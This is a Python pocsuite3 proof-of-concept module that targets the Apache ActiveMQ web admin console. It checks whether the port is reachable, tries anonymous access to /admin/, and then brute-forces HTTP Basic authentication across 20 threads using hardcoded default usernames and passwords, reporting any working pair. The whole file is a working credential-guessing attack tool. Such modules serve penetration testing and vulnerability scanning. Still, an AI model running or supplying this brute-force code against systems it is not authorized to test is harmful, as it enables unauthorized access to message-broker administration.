# -*- coding: utf-8 -*-
# author: seven
from pocsuite3.api import register_poc, POCBase, Output,logger,POC_CATEGORY,requests
from requests.auth import HTTPBasicAuth
from pocsuite3.lib.core.threads import run_threads
import socket
import queue
import itertools

activemq_username = ['admin','activemq','guest','test','root']
activemq_password = ['admin','123456','activemq','guest','12345','test','root']
class ActiveMQWeakPassPOC(POCBase):
    vulID = ''
    version = '1.0'
    author = ['seven']
    vulDate = 'Aug 6, 2020'
    createDate = 'Aug 6, 2020'
    name = 'activemq未授权访问/弱口令漏洞'
    appName = 'activemq'
    appVersion = 'v1.0.0'
    vulType = '弱口令/未授权访问'
    protocol = 'http'

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    def _verify(self):
        host = self.getg_option("rhost")
        port = self.getg_option("rport") or 8161

        result = {}
        url = f'http://{host}:{port}'
        activemq_burst(host,port,url)
        if not result_queue.empty():
            username,password = result_queue.get()
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Username'] = username
            result['VerifyInfo']['Password'] = password
            result['extra'] = username+':'+password
        return self.parse_output(result)
    def _attack(self):
        return self._verify()

task_queue = queue.Queue()
result_queue = queue.Queue()

def get_word_list():
    return itertools.product(activemq_username,activemq_password)

def port_check(host,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        connect = s.connect_ex((host, int(port)))
        if connect == 0:
            return True
    except Exception as e:
        logger.info(str(e))
    finally:
        s.close()
    logger.info(f'{host}:{port} not alive')
    return False

def anonymous_login(url):
    return activemq_login(url,anonymous=True)
    

def activemq_login(url,username=None,password=None,anonymous=False):
    url = url+'/admin/'
    try:
        if anonymous:
            res = requests.get(url)
        else:
            res = requests.get(url,auth=HTTPBasicAuth(username,password))
        if res.status_code == 200:
            return True
    except:
        pass
    return False

def task_init(url):
    for username,password in get_word_list():
        task_queue.put((url,username.strip(),password.strip()))

def task_thread():
    while not task_queue.empty():
        url,username,password = task_queue.get()
        logger.info('try burst {} use username:{} password:{}'.format(
            url,username, password))
        if activemq_login(url,username,password):
            with task_queue.mutex:
                task_queue.queue.clear()
            result_queue.put((username, password))

def activemq_burst(host,port,url):
    if not port_check(host,port):
        return
    if anonymous_login(url):
        logger.info('try burst {}:{} use username:{} password:{}'.format(
            host, port, 'anonymous', '<empty>'))
        result_queue.put(('anonymous', '<empty>'))
        return
    try:
        task_init(url)
        run_threads(20,task_thread)
    except Exception as e:
        logger.info(str(e))
        pass

register_poc(ActiveMQWeakPassPOC)